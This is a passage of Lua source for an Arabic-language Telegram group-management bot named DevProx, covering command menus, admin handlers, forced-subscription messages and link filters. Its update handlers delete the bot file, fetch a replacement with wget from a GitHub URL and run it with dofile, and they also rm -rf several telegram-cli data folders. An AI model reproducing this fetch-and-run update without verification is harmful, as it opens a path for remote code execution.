☬︙حذف قائمه المنع
☬︙حذف المحظورين
☬︙حذف الاوامر المضافه
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙اوامر الحذف للمطورين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙حذف المطورين
☬︙حذف قائمه العام
☬︙حذف ردود المطور
☬︙حذف المميزين عام
☬︙حذف المدراء العامين
☬︙حذف الادمنيه العامين
☬︙حذف المنشئين الاساسيين
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙[𝗗𝗘𝗩 𝗕𝗢𝗧](https://t.me/]]..ExDevUser..[[) 
☬︙[𝗧𝗘𝗔𝗠 𝗗𝗘𝗩](https://t.me/Dev_Prox)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
if text and text:match("^تعيين امر م8$") and is_leader(msg) or text and text:match("^تعيين امر م٨$") and is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙⌯ ٱرسـڵ كڵيشة (م8) ٱلٱن " ,  1, "md")
DevAbs:set(DevProx..'bot:help81'..msg.sender_user_id_..'', 'msg')
return false end
if text and text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(DevProx..'bot:help81'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم حفـۨظ ٱڵكڵيشة ٱڵـجـډيـډه" ,  1, "md")
DevAbs:set(DevProx..'bot:help81'..msg.sender_user_id_..'', 'no')
DevAbs:set(DevProx..'bot:help8', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م٨$") or text and text:match("^م8$") or text and text:match("^اوامر8$") or text and text:match("^اوامر٨$") then
if not is_sudo3(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙هذٱ ٱلٱمر ڵڵمطورين فقط ', 1, 'md')
else
local help = DevAbs:get(DevProx..'bot:help8')
local text =  [[
☬︙اوامر المطورين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙تحديث
☬︙السيرفر 
☬︙الكروبات
☬︙المطورين
☬︙الاحصائيات
☬︙المشتركين
☬︙المجموعات
☬︙روابط الكروبات
☬︙تحديث السورس
☬︙اسم البوت + غادر
☬︙ضع كليشه المطور
☬︙نسخه ملف السورس
☬︙معلومات المجموعه
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙الاوامر العامه للمطورين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙اضف رد عام
☬︙حذف رد عام
☬︙ردود المطور • ردود العام

☬︙اضف اغنيه
☬︙حذف اغنيه
☬︙اغاني • الاغاني المضافه

☬︙حظر عام
☬︙الغاء العام
☬︙قائمه العام

☬︙تعيين رد الخاص
☬︙جلب رد الخاص
☬︙حذف رد الخاص

☬︙ضع دعم
☬︙حذف الدعم

☬︙تنظيف الرسائل 
☬︙تنظيف الكروبات
☬︙تنظيف المشتركين

☬︙وضع • تغيير ↫ اسم البوت
☬︙حذف اسم البوت

☬︙جلب نسخه الكروبات
☬︙رفع النسخه + بالرد على الملف

☬︙الاشتراك الاجباري
☬︙تعيين الاشتراك الاجباري
☬︙قناة الاشتراك
☬︙تغيير قناة الاشتراك
☬︙حذف قناة الاشتراك

☬︙جلب كليشه الاشتراك
☬︙تغيير كليشه الاشتراك
☬︙حذف كليشه الاشتراك

☬︙كشف + -ايدي المجموعه
☬︙غادر + -ايدي المجموعه

☬︙فلتر عام + الكلمه ↫ للمنع
☬︙الغاء فلتر عام + الكلمه
☬︙قائمه المنع العام

☬︙اذاعه
☬︙اذاعه بالتوجيه
☬︙اذاعه بالخاص
☬︙اذاعه خاص بالتوجيه
☬︙اذاعه للكل بالتوجيه ↫ بالرد
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙[𝗗𝗘𝗩 𝗕𝗢𝗧](https://t.me/]]..ExDevUser..[[) 
☬︙[𝗧𝗘𝗔𝗠 𝗗𝗘𝗩](https://t.me/Dev_Prox)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end end
--     Source DevProx     --
if text == "تحديث السورس" and is_leader(msg) or text == "تحديث سورس" and is_leader(msg) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙جٱري تـۧحډيث سۄرس ډيف برۄكس', 1, 'md') 
os.execute('rm -rf DevProx.lua') 
os.execute('wget https://raw.githubusercontent.com/iq0abs/DevProx/master/DevProx.lua') 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم ٱڵتـۧحډيث ٱڵى ٱلٱصدٱر ٱڵجډيـډ', 1, 'md') 
dofile('DevProx.lua') 
io.popen("rm -rf ~/.telegram-cli/data/audio/*")
io.popen("rm -rf ~/.telegram-cli/data/document/*")
io.popen("rm -rf ~/.telegram-cli/data/photo/*")
io.popen("rm -rf ~/.telegram-cli/data/sticker/*")
io.popen("rm -rf ~/.telegram-cli/data/temp/*")
io.popen("rm -rf ~/.telegram-cli/data/thumb/*") 
io.popen("rm -rf ~/.telegram-cli/data/video/*")
io.popen("rm -rf ~/.telegram-cli/data/voice/*")
io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
print("\27[31;47m\n          ( تم تحديث السورس )          \n\27[0;34;49m\n") 
end
if text == 'تحديث' and is_leader(msg) or text == 'تحديث البوت' and is_leader(msg) or text == '↫ تحديث ☬' and is_leader(msg) then  
dofile('DevProx.lua')  
io.popen("rm -rf ~/.telegram-cli/data/audio/*") 
io.popen("rm -rf ~/.telegram-cli/data/document/*") 
io.popen("rm -rf ~/.telegram-cli/data/photo/*") 
io.popen("rm -rf ~/.telegram-cli/data/sticker/*") 
io.popen("rm -rf ~/.telegram-cli/data/temp/*") 
io.popen("rm -rf ~/.telegram-cli/data/thumb/*") 
io.popen("rm -rf ~/.telegram-cli/data/video/*") 
io.popen("rm -rf ~/.telegram-cli/data/voice/*") 
io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
print("\27[31;47m\n          ( تم تحديث البوت )          \n\27[0;34;49m\n") 
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم تـۧـحـډيـث ٱڵـبـۄت", 1, "md")
end 
--     Source DevProx     --
if text and text:match("^اضف رسائل (%d+)$") and is_monshid(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then  
DevAbs0 = text:match("^اضف رسائل (%d+)$")
DevAbs:set('ABS_PROX:'..bot_id..'id:user'..msg.chat_id_,DevAbs0)  
DevAbs:setex('ABS_PROX:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱرسـڵ عـدد ٱڵـرسٱئـڵ ٱلٱن \n☬︙ٱرسـڵ ٱڵغٱء لٱڵغٱء ٱلٱمر ", 1, "md")
Dev_Abs(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
end 
--     Source DevProx     --
if text and text:match("^ضع كليشه المطور$") or text and text:match("^وضع كليشه المطور$") or text and text:match("^تغيير كليشه المطور$") then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمطور ٱلٱسٱسي فقط ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱرسـڵ كڵيشة ٱڵـمطور ٱلٱن ", 1, "md")
DevAbs:setex(DevProx.."bot:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 100, true)
end end
if text and text:match("^مسح كليشه المطور$") or text and text:match("^حذف كليشه المطور$") then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمطور ٱلٱسٱسي فقط ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم حذف كڵيشة ٱڵمطور", 1, "md")
DevAbs:del(DevProx.."DevText")
end end
--     Source DevProx     --
if DevAbs:get(DevProx.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم ٱڵغاء ٱلٱمر", 1, "md") 
DevAbs:del(DevProx.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
DevAbs:del(DevProx.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
DevAbs:set(DevProx..'bot:textch:user',texxt)
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم تغيير كڵيشة ٱلٱشترٱك ٱلٱجبٱري', 1, 'md')
end
if text and text:match("^تغيير كليشه الاشتراك الاجباري$") and is_leader(msg) or text and text:match("^تغيير كليشه الاشتراك$") and is_leader(msg) then  
DevAbs:setex(DevProx.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
local text = '☬︙حسنٱ ٱرسڵ كڵيشة ٱلٱشترٱك ٱڵجديدة'  
Dev_Abs(msg.chat_id_, msg.id_, 1,text, 1, 'md') 
end
if text == "حذف كليشه الاشتراك الاجباري" or text == "حذف كليشه الاشتراك" then  
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمطور ٱلٱسٱسي فقط ', 1, 'md')
else
DevAbs:del(DevProx..'bot:textch:user')
textt = "☬︙تـۖم حذف كڵيشة ٱلٱشترٱك ٱلٱجبٱري"
Dev_Abs(msg.chat_id_, msg.id_, 1,textt, 1, 'md') 
end end
if text == 'كليشه الاشتراك' or text == 'جلب كليشه الاشتراك' then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمطور ٱلٱسٱسي فقط ', 1, 'md')
else
local chtext = DevAbs:get(DevProx.."bot:textch:user")
if chtext then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙كڵيشة ٱلٱشترٱك ٱلٱجبٱري : \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n['..chtext..']', 1, 'md')
else
local DevAbs6 = DevAbs:get(DevProx.."DevAbs3")
if DevAbs6 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙عذرٱ لٱيمكنك ٱستخدٱم ٱڵبوت \n☬︙رجائٱ ٱشترك في قنٱة ٱڵبوت \n☬︙ڵتتمكن من ٱستخدٱمه \n☬︙ٱڵقنٱت ↫ { ['..DevAbs6..'] }', 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵم يتم تعيين قنٱة ٱلٱشترٱك ٱلٱجبٱري \n☬︙ٱرسڵ (تعيين قناة الاشتراك) ڵڵتعيين ', 1, 'md')
end end end end
--     Source DevProx     --
if text and text:match("^القناة$") or text and text:match("^قناة السورس$") or text and text:match("^قنات السورس$") then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙Channel ↬ [@Dev_Prox]', 1, 'md')    
end end
--     Source DevProx     --
if is_leader(msg) then 
if (msg.content_.text_ == 'معلومات السيرفر' or msg.content_.text_ == 'stats server' or msg.content_.text_ == 'السيرفر') then 
local ABS_PROX = '☬︙*Info Server* ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
  local DevAbs1 = DevAbs:info()
  ABS_PROX = ABS_PROX..'☬︙*Uptime* ↬ ⤈\n`'..DevAbs1.server.uptime_in_days..' Days` || `'..DevAbs1.server.uptime_in_seconds..' seconds`\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
  ABS_PROX = ABS_PROX..'☬︙*Commands Processed* ↬ ⤈\n`'..DevAbs1.stats.total_commands_processed..'`\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
  ABS_PROX = ABS_PROX..'☬︙*Expired Keys* ↬ ⤈\n`'..DevAbs1.stats.expired_keys..'`\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
  ABS_PROX = ABS_PROX..'☬︙*Ops/sec* ↬ ⤈\n`'..DevAbs1.stats.instantaneous_ops_per_sec..'`\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
  Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end

end   
--     Source DevProx     --
--        end code        --
--     Source DevProx     --
elseif (data.ID == "UpdateChat") then
chat = data.chat_
chats[chat.id_] = chat
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
function get_msg_contact(extra, result, success)
DevAbs:incr(DevProx..'bot:editmsg'..result.chat_id_..result.sender_user_id_)
local text = result.content_.text_ or result.content_.caption_
if result.id_ and result.content_.text_ then
DevAbs:set(DevProx..'bot:editid'..result.id_,result.content_.text_)
end 
if not is_vipmem(result.sender_user_id_, result.chat_id_) then
check_filter_words(result, text)
if DevAbs:get(DevProx..'editmsg'..msg.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end
--     Source DevProx     --
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") then
if DevAbs:get(DevProx..'bot:links:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match("/") then
if DevAbs:get(DevProx..'bot:webpage:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("@") then
if DevAbs:get(DevProx..'tags:lock'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("#") then 
if DevAbs:get(DevProx..'bot:abstag:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("[\216-\219][\128-\191]") then
if DevAbs:get(DevProx..'bot:arabic:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("[A-Z]") or text:match("[a-z]") then
if DevAbs:get(DevProx..'bot:english:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end end end
getMessage(msg.chat_id_, msg.message_id_,get_msg_contact)
--     Source DevProx     --
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then
tdcli_function ({ID="GetChats", offset_order_="9223372036854775807", offset_chat_id_=0, limit_=20}, dl_cb, nil)
end
--     Source DevProx     --
end 
------------------------------------------------
-- This Source Was Developed By (ABS) @IQ_ABS.--
--   This Is The Source Channel @Dev_Prox .   --
--                - DevProx -                 --
--        -- https://t.me/Dev_Prox --         --
------------------------------------------------ 
